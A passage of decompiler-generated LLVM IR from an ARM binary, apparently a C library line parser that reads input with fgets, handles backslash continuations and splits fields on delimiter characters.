  br label %dec_label_pc_15c14

dec_label_pc_15c14:                               ; preds = %dec_label_pc_15c14.backedge, %dec_label_pc_15bcc
  %v2_15c30 = phi i32 [ %v0_15c14.pre, %dec_label_pc_15c14.backedge ], [ %tmp, %dec_label_pc_15bcc ]
  %v1_15c14 = add i32 %v2_15c30, 4
  %v2_15c14 = inttoptr i32 %v1_15c14 to i32*
  %v3_15c14 = load i32, i32* %v2_15c14, align 4
  store i32 %v3_15c14, i32* %r3.global-to-local, align 4
  %v2_15c18 = icmp eq i32 %v3_15c14, 0
  store i1 %v2_15c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c18, label %dec_label_pc_15c20, label %dec_label_pc_15c68

dec_label_pc_15c20:                               ; preds = %dec_label_pc_15c14
  %v1_15c20 = add i32 %v2_15c30, 16
  %v2_15c20 = inttoptr i32 %v1_15c20 to i32*
  %v3_15c20 = load i32, i32* %v2_15c20, align 4
  store i32 %v3_15c20, i32* %r3.global-to-local, align 4
  %v2_15c24 = icmp eq i32 %v3_15c20, 0
  store i1 %v2_15c24, i1* %cpsr_z.global-to-local, align 1
  %v1_15c28 = add i32 %v2_15c30, 8
  %v2_15c28 = inttoptr i32 %v1_15c28 to i32*
  %v3_15c28 = load i32, i32* %v2_15c28, align 4
  store i32 %v3_15c28, i32* %r3.global-to-local, align 4
  br i1 %v2_15c24, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_15c20
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_15c20, align 4
  %v0_15c34.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_15c20, %bb
  %v0_15c34 = phi i32 [ %v0_15c34.pre, %bb ], [ %v3_15c28, %dec_label_pc_15c20 ]
  %v2_15c34 = icmp eq i32 %v0_15c34, 0
  store i1 %v2_15c34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c34, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_15be0, i32* %r3.global-to-local, align 4
  %v2_15c3c = load i32, i32* @r5, align 4
  %v3_15c3c = add i32 %v2_15c3c, 8
  %v4_15c3c = inttoptr i32 %v3_15c3c to i32*
  store i32 %v1_15be0, i32* %v4_15c3c, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_15c40 = load i32, i32* @r5, align 4
  %v1_15c40 = add i32 %v0_15c40, 16
  %v2_15c40 = inttoptr i32 %v1_15c40 to i32*
  %v3_15c40 = load i32, i32* %v2_15c40, align 4
  store i32 %v3_15c40, i32* %r0.global-to-local, align 4
  %v1_15c44 = add i32 %v0_15c40, 8
  %v2_15c44 = inttoptr i32 %v1_15c44 to i32*
  %v3_15c44 = load i32, i32* %v2_15c44, align 4
  store i32 %v3_15c44, i32* %r3.global-to-local, align 4
  %v2_15c48 = add i32 %v3_15c44, %v3_15c40
  store i32 %v2_15c48, i32* @r0, align 4
  %v0_15c4c = call i32 @malloc()
  store i32 %v0_15c4c, i32* %r0.global-to-local, align 4
  %v2_15c50 = icmp eq i32 %v0_15c4c, 0
  store i1 %v2_15c50, i1* %cpsr_z.global-to-local, align 1
  %v1_15c54 = load i32, i32* @r5, align 4
  %v2_15c54 = add i32 %v1_15c54, 4
  %v3_15c54 = inttoptr i32 %v2_15c54 to i32*
  store i32 %v0_15c4c, i32* %v3_15c54, align 4
  br i1 %v2_15c50, label %dec_label_pc_15ec4, label %dec_label_pc_15c5c

dec_label_pc_15c5c:                               ; preds = %.thread
  %v0_15c5c = load i32, i32* @r5, align 4
  %v1_15c5c = add i32 %v0_15c5c, 20
  %v2_15c5c = inttoptr i32 %v1_15c5c to i32*
  %v3_15c5c = load i32, i32* %v2_15c5c, align 4
  %v1_15c60 = or i32 %v3_15c5c, 1
  store i32 %v1_15c60, i32* %r3.global-to-local, align 4
  store i32 %v1_15c60, i32* %v2_15c5c, align 4
  %v0_15c68.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c68

dec_label_pc_15c68:                               ; preds = %dec_label_pc_15c14, %dec_label_pc_15c5c
  %v1_15c70 = phi i32 [ %v2_15c30, %dec_label_pc_15c14 ], [ %v0_15c68.pre, %dec_label_pc_15c5c ]
  %v1_15c68 = add i32 %v1_15c70, 4
  %v2_15c68 = inttoptr i32 %v1_15c68 to i32*
  %v3_15c68 = load i32, i32* %v2_15c68, align 4
  store i32 %v3_15c68, i32* %r2.global-to-local, align 4
  %v4_15c68 = add i32 %v1_15c70, 8
  %v5_15c68 = inttoptr i32 %v4_15c68 to i32*
  %v6_15c68 = load i32, i32* %v5_15c68, align 4
  %v2_15c6c = add i32 %v6_15c68, %v3_15c68
  store i32 %v2_15c6c, i32* %r3.global-to-local, align 4
  %v2_15c70 = add i32 %v1_15c70, 12
  %v3_15c70 = inttoptr i32 %v2_15c70 to i32*
  store i32 %v2_15c6c, i32* %v3_15c70, align 4
  %v0_15c74 = load i32, i32* @fp, align 4
  store i32 %v0_15c74, i32* @r6, align 4
  br label %dec_label_pc_15c78

dec_label_pc_15c78:                               ; preds = %dec_label_pc_15d04, %dec_label_pc_15cf0, %dec_label_pc_15c68
  %v0_15c80 = phi i32 [ %v0_15c74, %dec_label_pc_15c68 ], [ %v1_15cf0, %dec_label_pc_15cf0 ], [ %v0_15c80.pre.pre, %dec_label_pc_15d04 ]
  %v0_15c78 = load i32, i32* @r5, align 4
  %v1_15c78 = add i32 %v0_15c78, 12
  store i32 %v1_15c78, i32* %r0.global-to-local, align 4
  %v1_15c7c = inttoptr i32 %v1_15c78 to i32*
  %v2_15c7c = load i32, i32* %v1_15c7c, align 4
  store i32 %v2_15c7c, i32* %r0.global-to-local, align 4
  %v3_15c7c = add i32 %v0_15c78, 16
  %v4_15c7c = inttoptr i32 %v3_15c7c to i32*
  %v5_15c7c = load i32, i32* %v4_15c7c, align 4
  %v2_15c80 = add i32 %v2_15c7c, %v0_15c80
  store i32 %v2_15c80, i32* %r0.global-to-local, align 4
  %v2_15c84 = sub i32 %v5_15c7c, %v0_15c80
  %v1_15c88 = inttoptr i32 %v0_15c78 to i32*
  %v2_15c88 = load i32, i32* %v1_15c88, align 4
  store i32 %v2_15c88, i32* %r2.global-to-local, align 4
  %v3_15c8c = call i32 @fgets(i32 %v2_15c80, i32 %v2_15c84, i32 %v2_15c88)
  store i32 %v3_15c8c, i32* %r0.global-to-local, align 4
  store i32 %v3_15c8c, i32* %r4.global-to-local, align 4
  %v2_15c90 = icmp eq i32 %v3_15c8c, 0
  store i1 %v2_15c90, i1* %cpsr_z.global-to-local, align 1
  %v0_15c98 = load i32, i32* @r5, align 4
  %v1_15c98 = add i32 %v0_15c98, 12
  br i1 %v2_15c90, label %dec_label_pc_15c98, label %dec_label_pc_15cb0

dec_label_pc_15c98:                               ; preds = %dec_label_pc_15c78
  store i32 %v1_15c98, i32* %r0.global-to-local, align 4
  %v1_15c9c = inttoptr i32 %v1_15c98 to i32*
  %v2_15c9c = load i32, i32* %v1_15c9c, align 4
  store i32 %v2_15c9c, i32* %r0.global-to-local, align 4
  %v3_15c9c = add i32 %v0_15c98, 16
  %v4_15c9c = inttoptr i32 %v3_15c9c to i32*
  %v5_15c9c = load i32, i32* %v4_15c9c, align 4
  store i32 %v5_15c9c, i32* %r2.global-to-local, align 4
  %v3_15ca4 = inttoptr i32 %v2_15c9c to i8*
  %v4_15ca4 = call i32 @__GI_memset(i8* %v3_15ca4, i32 0, i32 %v5_15c9c)
  store i32 %v4_15ca4, i32* %r0.global-to-local, align 4
  %v0_15ca8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15ec8

dec_label_pc_15cb0:                               ; preds = %dec_label_pc_15c78
  %v2_15cb0 = inttoptr i32 %v1_15c98 to i32*
  %v3_15cb0 = load i32, i32* %v2_15cb0, align 4
  store i32 %v3_15cb0, i32* @r4, align 4
  %v1_15cb4 = load i32, i32* @r6, align 4
  %v2_15cb4 = add i32 %v1_15cb4, %v3_15cb0
  %v3_15cb4 = inttoptr i32 %v2_15cb4 to i8*
  store i32 %v2_15cb4, i32* %r0.global-to-local, align 4
  %v3_15cb8 = call i32 @strlen(i8* %v3_15cb4)
  %v0_15cc0 = load i32, i32* @r6, align 4
  %v2_15cc0 = add i32 %v0_15cc0, %v3_15cb8
  store i32 %v2_15cc0, i32* @r6, align 4
  %v0_15cc4 = load i32, i32* @r4, align 4
  store i32 %v0_15cc4, i32* @r0, align 4
  %v2_15cc8 = call i32 @__GI_strchr(i32 %v0_15cc4, i32 10)
  store i32 %v2_15cc8, i32* %r0.global-to-local, align 4
  %v2_15ccc = icmp eq i32 %v2_15cc8, 0
  store i1 %v2_15ccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ccc, label %dec_label_pc_15cf8, label %dec_label_pc_15cd4

dec_label_pc_15cd4:                               ; preds = %dec_label_pc_15cb0
  %v1_15cd4 = inttoptr i32 %v2_15cc8 to i8*
  %v2_15cd4 = load i8, i8* %v1_15cd4, align 1
  %v3_15cd4 = zext i8 %v2_15cd4 to i32
  %v1_15cd8 = add nuw nsw i32 %v3_15cd4, 255
  %v1_15cdc = urem i32 %v1_15cd8, 256
  store i32 %v1_15cdc, i32* %r3.global-to-local, align 4
  %v7_15ce0 = icmp eq i32 %v1_15cdc, 92
  store i1 %v7_15ce0, i1* %cpsr_z.global-to-local, align 1
  %v1_15ce4 = trunc i32 %v1_15cd8 to i8
  store i8 %v1_15ce4, i8* %v1_15cd4, align 1
  %v0_15ce8 = load i32, i32* @r6, align 4
  %v1_15ce8 = add i32 %v0_15ce8, -1
  store i32 %v1_15ce8, i32* @r6, align 4
  %v0_15cec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15cec, label %dec_label_pc_15cf0, label %dec_label_pc_15d7c

dec_label_pc_15cf0:                               ; preds = %dec_label_pc_15cd4
  %v1_15cf0 = add i32 %v0_15ce8, -2
  store i32 %v1_15cf0, i32* @r6, align 4
  br label %dec_label_pc_15c78

dec_label_pc_15cf8:                               ; preds = %dec_label_pc_15cb0
  %v0_15cf8 = load i32, i32* @r5, align 4
  %v1_15cf8 = add i32 %v0_15cf8, 20
  %v2_15cf8 = inttoptr i32 %v1_15cf8 to i32*
  %v3_15cf8 = load i32, i32* %v2_15cf8, align 4
  store i32 %v3_15cf8, i32* %r3.global-to-local, align 4
  %v2_15cfc = icmp eq i32 %v3_15cf8, 0
  store i1 %v2_15cfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cfc, label %dec_label_pc_15d34, label %dec_label_pc_15d04

dec_label_pc_15d04:                               ; preds = %dec_label_pc_15cf8
  %v1_15d04 = add i32 %v0_15cf8, 16
  %v2_15d04 = inttoptr i32 %v1_15d04 to i32*
  %v3_15d04 = load i32, i32* %v2_15d04, align 4
  store i32 %v3_15d04, i32* %r3.global-to-local, align 4
  %v1_15d08 = add i32 %v0_15cf8, 8
  %v2_15d08 = inttoptr i32 %v1_15d08 to i32*
  %v3_15d08 = load i32, i32* %v2_15d08, align 4
  %v1_15d0c = add i32 %v3_15d04, 4096
  store i32 %v1_15d0c, i32* %r3.global-to-local, align 4
  %v2_15d10 = add i32 %v3_15d08, %v1_15d0c
  store i32 %v1_15d0c, i32* %v2_15d04, align 4
  %v0_15d18 = load i32, i32* @r5, align 4
  %v1_15d18 = add i32 %v0_15d18, 4
  %v2_15d18 = inttoptr i32 %v1_15d18 to i32*
  %v3_15d18 = load i32, i32* %v2_15d18, align 4
  store i32 %v3_15d18, i32* %r0.global-to-local, align 4
  %v4_15d1c = inttoptr i32 %v3_15d18 to i32*
  %v5_15d1c = call i32 @realloc(i32* %v4_15d1c, i32 %v2_15d10, i32 %v2_15c88, i32 %v1_15d0c)
  store i32 %v5_15d1c, i32* %r0.global-to-local, align 4
  %v0_15d20 = load i32, i32* @r5, align 4
  %v1_15d20 = add i32 %v0_15d20, 8
  %v2_15d20 = inttoptr i32 %v1_15d20 to i32*
  %v3_15d20 = load i32, i32* %v2_15d20, align 4
  %v2_15d24 = add i32 %v3_15d20, %v5_15d1c
  store i32 %v2_15d24, i32* %r3.global-to-local, align 4
  %v2_15d28 = add i32 %v0_15d20, 12
  %v3_15d28 = inttoptr i32 %v2_15d28 to i32*
  store i32 %v2_15d24, i32* %v3_15d28, align 4
  %v1_15d2c = load i32, i32* @r5, align 4
  %v2_15d2c = add i32 %v1_15d2c, 4
  %v3_15d2c = inttoptr i32 %v2_15d2c to i32*
  store i32 %v5_15d1c, i32* %v3_15d2c, align 4
  %v0_15c80.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15c78

dec_label_pc_15d34:                               ; preds = %dec_label_pc_15cf8, %.dec_label_pc_15d34_crit_edge
  %v0_15d34 = phi i32 [ %v0_15d34.pre, %.dec_label_pc_15d34_crit_edge ], [ %v0_15cf8, %dec_label_pc_15cf8 ]
  %v1_15d34 = inttoptr i32 %v0_15d34 to i32*
  %v2_15d34 = load i32, i32* %v1_15d34, align 4
  store i32 %v2_15d34, i32* @r1, align 4
  %v1_15d38 = add i32 %v2_15d34, 52
  %v2_15d38 = inttoptr i32 %v1_15d38 to i32*
  %v3_15d38 = load i32, i32* %v2_15d38, align 4
  store i32 %v3_15d38, i32* %r3.global-to-local, align 4
  %v2_15d3c = icmp eq i32 %v3_15d38, 0
  store i1 %v2_15d3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d3c, label %dec_label_pc_15d68, label %dec_label_pc_15d44

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15d34
  %v1_15d44 = add i32 %v2_15d34, 16
  %v2_15d44 = inttoptr i32 %v1_15d44 to i32*
  %v3_15d44 = load i32, i32* %v2_15d44, align 4
  store i32 %v3_15d44, i32* %r2.global-to-local, align 4
  %v1_15d48 = add i32 %v2_15d34, 24
  %v2_15d48 = inttoptr i32 %v1_15d48 to i32*
  %v3_15d48 = load i32, i32* %v2_15d48, align 4
  store i32 %v3_15d48, i32* %r3.global-to-local, align 4
  %v3_15d4c = icmp ult i32 %v3_15d44, %v3_15d48
  %v9_15d4c = icmp eq i32 %v3_15d44, %v3_15d48
  store i1 %v9_15d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15d4c, label %dec_label_pc_15d70thread-pre-split, label %dec_label_pc_15d5c

dec_label_pc_15d5c:                               ; preds = %dec_label_pc_15d44
  store i32 %v2_15d34, i32* %r0.global-to-local, align 4
  %v1_15d60 = inttoptr i32 %v2_15d34 to i16*
  %v2_15d60 = call i32 @getc_unlocked(i16* %v1_15d60)
  store i32 %v2_15d60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d70

dec_label_pc_15d68:                               ; preds = %dec_label_pc_15d34
  store i32 %v2_15d34, i32* %r0.global-to-local, align 4
  %v1_15d6c = call i32 @__GI_fgetc(i32 %v2_15d34)
  store i32 %v1_15d6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d70

dec_label_pc_15d70thread-pre-split:               ; preds = %dec_label_pc_15d44
  %v2_15d50 = inttoptr i32 %v3_15d44 to i8*
  %v3_15d50 = load i8, i8* %v2_15d50, align 1
  %v4_15d50 = zext i8 %v3_15d50 to i32
  store i32 %v4_15d50, i32* %r0.global-to-local, align 4
  %v6_15d50 = add i32 %v3_15d44, 1
  store i32 %v6_15d50, i32* %r2.global-to-local, align 4
  store i32 %v6_15d50, i32* %v2_15d44, align 4
  %v0_15d70.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d70

dec_label_pc_15d70:                               ; preds = %dec_label_pc_15d70thread-pre-split, %dec_label_pc_15d5c, %dec_label_pc_15d68
  %v1_15d74 = phi i32 [ %v0_15d70.pr, %dec_label_pc_15d70thread-pre-split ], [ %v2_15d60, %dec_label_pc_15d5c ], [ %v1_15d6c, %dec_label_pc_15d68 ]
  %v7_15d70 = icmp eq i32 %v1_15d74, 10
  store i1 %v7_15d70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15d70, label %dec_label_pc_15d7c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_15d70
  %v8_15d74 = icmp eq i32 %v1_15d74, -1
  store i1 %v8_15d74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15d74, label %dec_label_pc_15d7c.loopexit, label %.dec_label_pc_15d34_crit_edge

.dec_label_pc_15d34_crit_edge:                    ; preds = %bb66
  %v0_15d34.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15d34

dec_label_pc_15d7c.loopexit:                      ; preds = %bb66, %dec_label_pc_15d70
  %v0_15d7c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15d7c

dec_label_pc_15d7c:                               ; preds = %dec_label_pc_15cd4, %dec_label_pc_15d7c.loopexit
  %v0_15d7c = phi i32 [ %v0_15d7c.pre, %dec_label_pc_15d7c.loopexit ], [ %v1_15ce8, %dec_label_pc_15cd4 ]
  %v7_15d7c = icmp eq i32 %v0_15d7c, -1
  store i1 %v7_15d7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15d7c, label %dec_label_pc_15ec4, label %dec_label_pc_15d84

dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d7c
  store i32 %v1_15bec, i32* %r3.global-to-local, align 4
  store i1 %v2_15d88, i1* %cpsr_z.global-to-local, align 1
  %v0_15d8c = load i32, i32* @r5, align 4
  %v1_15d8c = add i32 %v0_15d8c, 12
  %v2_15d8c = inttoptr i32 %v1_15d8c to i32*
  %v3_15d8c = load i32, i32* %v2_15d8c, align 4
  store i32 %v3_15d8c, i32* @r4, align 4
  br i1 %v2_15d88, label %dec_label_pc_15da4, label %dec_label_pc_15d94

dec_label_pc_15d94:                               ; preds = %dec_label_pc_15d84
  store i32 %v3_15d8c, i32* @r0, align 4
  %v0_15d98 = load i32, i32* @sl, align 4
  %v2_15d9c = inttoptr i32 %v3_15d8c to i8*
  %v3_15d9c = call i32 @__GI_strspn(i8* %v2_15d9c, i32 %v0_15d98)
  store i32 %v3_15d9c, i32* %r0.global-to-local, align 4
  %v0_15da0 = load i32, i32* @r4, align 4
  %v2_15da0 = add i32 %v0_15da0, %v3_15d9c
  store i32 %v2_15da0, i32* @r4, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d84, %dec_label_pc_15d94
  %v0_15da4 = phi i32 [ %v3_15d8c, %dec_label_pc_15d84 ], [ %v2_15da0, %dec_label_pc_15d94 ]
  %v1_15da4 = inttoptr i32 %v0_15da4 to i8*
  %v2_15da4 = load i8, i8* %v1_15da4, align 1
  %v3_15da4 = zext i8 %v2_15da4 to i32
  store i32 %v3_15da4, i32* %r2.global-to-local, align 4
  %v2_15da8 = icmp eq i8 %v2_15da4, 0
  store i1 %v2_15da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15da8, label %dec_label_pc_15c14.backedge, label %dec_label_pc_15db0

dec_label_pc_15c14.backedge:                      ; preds = %dec_label_pc_15da4, %dec_label_pc_15db0, %dec_label_pc_15ebc
  %v0_15c14.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c14

dec_label_pc_15db0:                               ; preds = %dec_label_pc_15da4
  %v0_15db0 = load i32, i32* @r7, align 4
  %v1_15db0 = inttoptr i32 %v0_15db0 to i8*
  %v2_15db0 = load i8, i8* %v1_15db0, align 1
  %v3_15db0 = zext i8 %v2_15db0 to i32
  store i32 %v3_15db0, i32* %r3.global-to-local, align 4
  %v9_15db4 = icmp eq i8 %v2_15db0, %v2_15da4
  store i1 %v9_15db4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15db4, label %dec_label_pc_15c14.backedge, label %dec_label_pc_15dbc

dec_label_pc_15dbc:                               ; preds = %dec_label_pc_15db0
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_15dc0 = load i32, i32* @r5, align 4
  %v1_15dc0 = add i32 %v0_15dc0, 4
  %v2_15dc0 = inttoptr i32 %v1_15dc0 to i32*
  %v3_15dc0 = load i32, i32* %v2_15dc0, align 4
  store i32 %v3_15dc0, i32* %r0.global-to-local, align 4
  %v0_15dc4 = load i32, i32* @fp, align 4
  store i32 %v3_15dc0, i32* %v1_15de0, align 4
  store i32 %v3_15bd8, i32* %r2.global-to-local, align 4
  %v3_15dd0 = inttoptr i32 %v3_15dc0 to i8*
  %v4_15dd0 = call i32 @__GI_memset(i8* %v3_15dd0, i32 %v0_15dc4, i32 %v3_15bd8)
  store i32 %v4_15dd0, i32* %r0.global-to-local, align 4
  %v0_15dd4 = load i32, i32* @fp, align 4
  store i32 %v0_15dd4, i32* @r6, align 4
  %v0_15e9412 = load i32, i32* @r4, align 4
  %v1_15e9413 = inttoptr i32 %v0_15e9412 to i8*
  %v2_15e9414 = load i8, i8* %v1_15e9413, align 1
  %v3_15e9415 = zext i8 %v2_15e9414 to i32
  store i32 %v3_15e9415, i32* %r2.global-to-local, align 4
  %v2_15e9816 = icmp eq i8 %v2_15e9414, 0
  store i1 %v2_15e9816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e9816, label %dec_label_pc_15eb0, label %dec_label_pc_15ea0

dec_label_pc_15ddc:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15de0 = load i32, i32* %v1_15de0, align 4
  store i32 %v2_15de0, i32* %r3.global-to-local, align 4
  store i32 %v1_15bf0, i32* %r2.global-to-local, align 4
  %v9_15de8 = icmp eq i32 %v2_15dec, %v1_15bf0
  store i1 %v9_15de8, i1* %cpsr_z.global-to-local, align 1
  %v5_15dec = mul i32 %v2_15dec, 4
  %v6_15dec = add i32 %v2_15de0, %v5_15dec
  %v7_15dec = inttoptr i32 %v6_15dec to i32*
  store i32 %v0_15dec, i32* %v7_15dec, align 4
  br i1 %v9_15de8, label %dec_label_pc_15df4, label %dec_label_pc_15e00

dec_label_pc_15df4:                               ; preds = %dec_label_pc_15ddc
  store i32 %v1_15bfc, i32* %r3.global-to-local, align 4
  store i1 %v2_15df8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15df8, label %dec_label_pc_15e00, label %dec_label_pc_15e20

dec_label_pc_15e00:                               ; preds = %dec_label_pc_15df4, %dec_label_pc_15ddc
  %v0_15e00 = load i32, i32* @r7, align 4
  %v1_15e00 = inttoptr i32 %v0_15e00 to i8*
  %v2_15e00 = load i8, i8* %v1_15e00, align 1
  %v3_15e00 = zext i8 %v2_15e00 to i32
  store i32 %v3_15e00, i32* %r3.global-to-local, align 4
  %v2_15e04 = icmp eq i8 %v2_15e00, 0
  store i1 %v2_15e04, i1* %cpsr_z.global-to-local, align 1
  %v0_15e08 = load i32, i32* @r4, align 4
  store i32 %v0_15e08, i32* @r0, align 4
  %v1_15e0c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_15e04, i32 %v1_15e0c, i32 %v0_15e00
  store i32 %storemerge, i32* @r1, align 4
  %v0_15e14 = call i32 @strcspn()
  store i32 %v0_15e14, i32* %r0.global-to-local, align 4
  %v0_15e18 = load i32, i32* @r4, align 4
  %v2_15e18 = add i32 %v0_15e18, %v0_15e14
  store i32 %v2_15e18, i32* @r4, align 4
  br label %dec_label_pc_15e58

dec_label_pc_15e20:                               ; preds = %dec_label_pc_15df4
  %v0_15e20 = load i32, i32* @r4, align 4
  store i32 %v0_15e20, i32* @r0, align 4
  %v0_15e24 = load i32, i32* @r7, align 4
  %v1_15e24 = inttoptr i32 %v0_15e24 to i8*
  %v2_15e24 = load i8, i8* %v1_15e24, align 1
  %v3_15e24 = zext i8 %v2_15e24 to i32
  %v5_15e28 = call i32 @__GI_strchrnul(i32 %v0_15e20, i32 %v3_15e24, i32 %v1_15bf0, i32 %v1_15bfc)
  store i32 %v5_15e28, i32* %r0.global-to-local, align 4
  store i32 %v1_15bec, i32* %r2.global-to-local, align 4
  store i1 %v2_15d88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_15e28, i32* @r4, align 4
  br i1 %v2_15d88, label %dec_label_pc_15e58, label %dec_label_pc_15e44

dec_label_pc_15e40:                               ; preds = %dec_label_pc_15e44
  %v1_15e40 = add i32 %v0_15e58.pre, -1
  store i32 %v1_15e40, i32* @r4, align 4
  br label %dec_label_pc_15e44

dec_label_pc_15e44:                               ; preds = %dec_label_pc_15e20, %dec_label_pc_15e40
  %v0_15e44 = phi i32 [ %v1_15e40, %dec_label_pc_15e40 ], [ %v5_15e28, %dec_label_pc_15e20 ]
  %v1_15e44 = add i32 %v0_15e44, -1
  %v2_15e44 = inttoptr i32 %v1_15e44 to i8*
  %v3_15e44 = load i8, i8* %v2_15e44, align 1
  %v4_15e44 = zext i8 %v3_15e44 to i32
  %v0_15e48 = load i32, i32* @sl, align 4
  store i32 %v0_15e48, i32* @r0, align 4
  %v2_15e4c = call i32 @__GI_strchr(i32 %v0_15e48, i32 %v4_15e44)
  store i32 %v2_15e4c, i32* %r0.global-to-local, align 4
  %v2_15e50 = icmp eq i32 %v2_15e4c, 0
  store i1 %v2_15e50, i1* %cpsr_z.global-to-local, align 1
  %v0_15e58.pre = load i32, i32* @r4, align 4
  br i1 %v2_15e50, label %dec_label_pc_15e58, label %dec_label_pc_15e40

dec_label_pc_15e58:                               ; preds = %dec_label_pc_15e44, %dec_label_pc_15e20, %dec_label_pc_15e00
  %v3_15e64 = phi i32 [ %v5_15e28, %dec_label_pc_15e20 ], [ %v2_15e18, %dec_label_pc_15e00 ], [ %v0_15e58.pre, %dec_label_pc_15e44 ]
  %v1_15e58 = inttoptr i32 %v3_15e64 to i8*
  %v2_15e58 = load i8, i8* %v1_15e58, align 1
  %v3_15e58 = zext i8 %v2_15e58 to i32
  store i32 %v3_15e58, i32* %r2.global-to-local, align 4
  %v0_15e5c = load i32, i32* @r7, align 4
  %v1_15e5c = inttoptr i32 %v0_15e5c to i8*
  %v2_15e5c = load i8, i8* %v1_15e5c, align 1
  %v3_15e5c = zext i8 %v2_15e5c to i32
  store i32 %v3_15e5c, i32* %r3.global-to-local, align 4
  %v9_15e60 = icmp eq i8 %v2_15e5c, %v2_15e58
  store i1 %v9_15e60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15e60, label %bb69, label %dec_label_pc_15e6c

bb69:                                             ; preds = %dec_label_pc_15e58
  %v1_15e64 = load i32, i32* @fp, align 4
  %v2_15e64 = trunc i32 %v1_15e64 to i8
  store i8 %v2_15e64, i8* %v1_15e58, align 1
  %v0_15e68.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15e68.pr, label %bb71, label %.dec_label_pc_15e6c_crit_edge

.dec_label_pc_15e6c_crit_edge:                    ; preds = %bb69
  %v0_15e6c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15e6c

dec_label_pc_15e6c:                               ; preds = %.dec_label_pc_15e6c_crit_edge, %dec_label_pc_15e58
  %v0_15e6c = phi i32 [ %v0_15e6c.pre, %.dec_label_pc_15e6c_crit_edge ], [ %v3_15e58, %dec_label_pc_15e58 ]
  %v2_15e6c = icmp eq i32 %v0_15e6c, 0
  store i1 %v2_15e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e6c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_15e6c
  %v1_15e70 = load i32, i32* @fp, align 4
  %v2_15e70 = trunc i32 %v1_15e70 to i8
  %v3_15e70 = load i32, i32* @r4, align 4
  %v4_15e70 = inttoptr i32 %v3_15e70 to i8*
  store i8 %v2_15e70, i8* %v4_15e70, align 1
  %v5_15e70 = load i32, i32* @r4, align 4
  %v6_15e70 = add i32 %v5_15e70, 1
  store i32 %v6_15e70, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_15e6c, %bb70
  %v2_15e74 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15e74, i32* %r3.global-to-local, align 4
  %v2_15e78 = icmp eq i32 %v2_15e74, 0
  store i1 %v2_15e78, i1* %cpsr_z.global-to-local, align 1
  %v0_15e94.pre = load i32, i32* @r4, align 4
  br i1 %v2_15e78, label %dec_label_pc_15e90, label %dec_label_pc_15e80

dec_label_pc_15e80:                               ; preds = %bb71
  store i32 %v0_15e94.pre, i32* @r0, align 4
  %v0_15e84 = load i32, i32* @sl, align 4
  %v2_15e88 = inttoptr i32 %v0_15e94.pre to i8*
  %v3_15e88 = call i32 @__GI_strspn(i8* %v2_15e88, i32 %v0_15e84)
  store i32 %v3_15e88, i32* %r0.global-to-local, align 4
  %v0_15e8c = load i32, i32* @r4, align 4
  %v2_15e8c = add i32 %v0_15e8c, %v3_15e88
  store i32 %v2_15e8c, i32* @r4, align 4
  br label %dec_label_pc_15e90

dec_label_pc_15e90:                               ; preds = %bb71, %dec_label_pc_15e80
  %v0_15e94 = phi i32 [ %v2_15e8c, %dec_label_pc_15e80 ], [ %v0_15e94.pre, %bb71 ]
  %v0_15e90 = load i32, i32* @r6, align 4
  %v1_15e90 = add i32 %v0_15e90, 1
  store i32 %v1_15e90, i32* @r6, align 4
  %v1_15e94 = inttoptr i32 %v0_15e94 to i8*
  %v2_15e94 = load i8, i8* %v1_15e94, align 1
  %v3_15e94 = zext i8 %v2_15e94 to i32
  store i32 %v3_15e94, i32* %r2.global-to-local, align 4
  %v2_15e98 = icmp eq i8 %v2_15e94, 0
  store i1 %v2_15e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e98, label %dec_label_pc_15eb0, label %dec_label_pc_15ea0

dec_label_pc_15ea0:                               ; preds = %dec_label_pc_15dbc, %dec_label_pc_15e90
  %v0_15dec = phi i32 [ %v0_15e94, %dec_label_pc_15e90 ], [ %v0_15e9412, %dec_label_pc_15dbc ]
